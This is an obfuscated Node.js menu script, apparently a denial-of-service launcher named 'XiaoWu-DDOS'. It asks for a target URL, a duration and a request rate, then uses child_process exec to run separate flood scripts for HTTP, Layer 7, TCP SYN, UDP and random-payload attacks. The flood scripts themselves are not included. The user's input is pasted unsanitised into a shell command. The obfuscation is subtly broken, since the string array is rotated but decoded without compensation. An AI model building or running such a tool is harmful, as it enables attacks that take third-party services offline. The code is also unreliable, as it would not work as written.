const _0x小吴数组 = [
  'chalk',           // 0x0
  'readline',        // 0x1
  'child_process',   // 0x2
  'createInterface', // 0x3
  'stdin',           // 0x4
  'stdout',          // 0x5
  'question',        // 0x6
  'cyan',            // 0x7
  '\n🌐 Masukkan target URL: ', // 0x8
  '⏳ Durasi attack (detik): ', // 0x9
  '⚡ Jumlah requests per detik: ', // 0xa
  'log',             // 0xb
  'green',           // 0xc
  'error',           // 0xd
  'red',             // 0xe
  'close',           // 0xf
  'greenBright',     // 0x10
`
ddddddxxxxxxxxxkookxo,xooxxklloxddcdxkddccdddddddx
dddddxxxxxxxxxxxxd:,:;;,l;,:;;cd:ccdldldodxxdxxxxx
dddddxxxxddddddxdl''.;,:co;.....''....';:dxxxxxxkk
dddddddxxxddxxdlddl,...,l:........''.....'lxddxxxk
odddddddxxxxxd:odddl,'.,c..................:dxxxxx
oooooddddxxxo:;;:::;;,'''..............'....:dxxxx
oooooddddddl;,'.',,;,,;,,;;,,,,,.'.'''',,....cxxxx
ooooddddddc,'....''',;,,,;c:,,,;;,,;,,';,....,xxxx
oooodddddl;.......';,'.'';kl'''',,',;',','....dxxx
loooooooo;.......,lc,..,;kOc'',,','',''.''....lxxx
llllooool.......,;:;,;cddOkl:;:::::,'',.'......dxx
lllllllll........'..:lok00Oxdl;'.';;,,,''......dkk
cccllllll,'...',:olllddOKK0Odoxc::;;c:,,,'.....ckk
::::ccccc:.'.'cdkO000kx0KKKXXKKKKK00Oo:,:;'....'dk
;::::::::,.'',lxO000OdkKK0KXXNNNXXXK0d:,:,;;,.''ok
;;;::::::'',',:dkO00kccxdk0XXXXXXXK0Oo:,,'':..'.ck
;;;::::::''';;;oxkO0Oxxk0KKXXXXXKK0Odc;,,'.....,:x
;;:::::::;'';:;:oxkkkdldxOKKKKKK00kxo:''..... .,;o
:::::::ccc;,,::::ldxo::clldO000OOkdoc'...'... .,,l
:::cclllll:::;c;':ldxdxxkO000Okxdoc:'.'.,'. . .,,l
cclloooooollcc:.';;cdkO0KK00Oxdc;;c:...'.......,.:
llooooolllllc,',,;;;:ldkkkxoc;,,col....;.,.....;.;
llllolllccc:'',,,..,;;;;;;;;;coxxx;....;.,'....,.,
ccccccccc:'.',,,'..,,;;;;:coxkkkxl.. ..,..',...'',
:::ccccc:...,,,,...,,;;;:lxkkkxkd:.   .,'.',....''
`, // 0x11 ASCII
  'clear',           // 0x12
  'cyanBright',      // 0x13
  '\n🔥 Welcome to XiaoWu-DDOS 🔥\n', // 0x14
  '1) Flood Link',   // 0x15
  '2) DDOS Layer7',  // 0x16
  '3) TCP SYN Flood',// 0x17
  '4) UDP Flood',    // 0x18
  '5) Random Payload Attack', // 0x19
  'red',             // 0x1a
  '6) Exit\n',       // 0x1b
  'yellow',          // 0x1c
  'Select method > ',// 0x1d
  'method1.js',      // 0x1e
  'method2.js',      // 0x1f
  'method3.js',      // 0x20
  'method4.js',      // 0x21
  'method5.js',      // 0x22
  '\n[!] Exiting...',// 0x23
  '\n[!] Invalid option.' // 0x24
];

(function(_0x小吴1,_0x小吴2){const _0x小吴3=function(_0x小吴4){while(--_0x小吴4){_0x小吴1.push(_0x小吴1.shift());}};_0x小吴3(++_0x小吴2);}(_0x小吴数组,0x1f4));
const _0x小吴解码=function(_0x小吴5,_0x小吴6){_0x小吴5=_0x小吴5-0x0;return _0x小吴数组[_0x小吴5];};

const 小吴颜色=require(_0x小吴解码('0x0')),
      小吴输入=require(_0x小吴解码('0x1')),
      小吴执行=require(_0x小吴解码('0x2'))['exec'];

function 小吴启动(_0x小吴方法,_0x小吴名字){
    const 小吴界面=小吴输入[_0x小吴解码('0x3')]({
        'input':process[_0x小吴解码('0x4')],
        'output':process[_0x小吴解码('0x5')]
    });
    小吴界面[_0x小吴解码('0x6')](小吴颜色[_0x小吴解码('0x7')](_0x小吴解码('0x8')),_0x小吴网址=>{
        小吴界面[_0x小吴解码('0x6')](小吴颜色[_0x小吴解码('0x7')](_0x小吴解码('0x9')),_0x小吴时间=>{
            小吴界面[_0x小吴解码('0x6')](小吴颜色[_0x小吴解码('0x7')](_0x小吴解码('0xa')),_0x小吴速率=>{
                console[_0x小吴解码('0xb')](小吴颜色[_0x小吴解码('0xc')](`💣 ${_0x小吴名字} 攻击 ${_0x小吴网址} 持续 ${_0x小吴时间} 秒 每秒 ${_0x小吴速率} req/s`));
                小吴执行(`node ${_0x小吴方法} ${_0x小吴网址} ${_0x小吴时间} ${_0x小吴速率}`,(小吴错误,小吴输出)=>{
                    if(小吴错误)console[_0x小吴解码('0xd')](小吴颜色[_0x小吴解码('0xe')](小吴错误));
                    console[_0x小吴解码('0xb')](小吴输出);
                    小吴界面[_0x小吴解码('0xf')]();
                });
            });
        });
    });
}

console[_0x小吴解码('0x12')]();
console[_0x小吴解码('0xb')](小吴颜色[_0x小吴解码('0x10')](_0x小吴解码('0x11')));
console[_0x小吴解码('0xb')](小吴颜色[_0x小吴解码('0x13')](_0x小吴解码('0x14')));
console[_0x小吴解码('0xb')](小吴颜色[_0x小吴解码('0xc')](_0x小吴解码('0x15')));
console[_0x小吴解码('0xb')](小吴颜色[_0x小吴解码('0xc')](_0x小吴解码('0x16')));
console[_0x小吴解码('0xb')](小吴颜色[_0x小吴解码('0xc')](_0x小吴解码('0x17')));
console[_0x小吴解码('0xb')](小吴颜色[_0x小吴解码('0xc')](_0x小吴解码('0x18')));
console[_0x小吴解码('0xb')](小吴颜色[_0x小吴解码('0x1a')](_0x小吴解码('0x19')+_0x小吴解码('0x1b')));

const 小吴界面=小吴输入[_0x小吴解码('0x3')]({
    'input':process[_0x小吴解码('0x4')],
    'output':process[_0x小吴解码('0x5')]
});
小吴界面[_0x小吴解码('0x6')](小吴颜色[_0x小吴解码('0x1c')](_0x小吴解码('0x1d')),_0x小吴选择=>{
    switch(_0x小吴选择){
        case'1':小吴启动(_0x小吴解码('0x1e'),'Flood Link');break;
        case'2':小吴启动(_0x小吴解码('0x1f'),'DDOS Layer7');break;
        case'3':小吴启动(_0x小吴解码('0x20'),'TCP SYN Flood');break;
        case'4':小吴启动(_0x小吴解码('0x21'),'UDP Flood');break;
        case'5':小吴启动(_0x小吴解码('0x22'),'Random Payload Attack');break;
        case'6':
            console[_0x小吴解码('0xd')](小吴颜色[_0x小吴解码('0xe')](_0x小吴解码('0x23')));
            小吴界面[_0x小吴解码('0xf')]();
            break;
        default:
            console[_0x小吴解码('0xd')](小吴颜色[_0x小吴解码('0xe')](_0x小吴解码('0x24')));
            小吴界面[_0x小吴解码('0xf')]();
            break;
    }
});
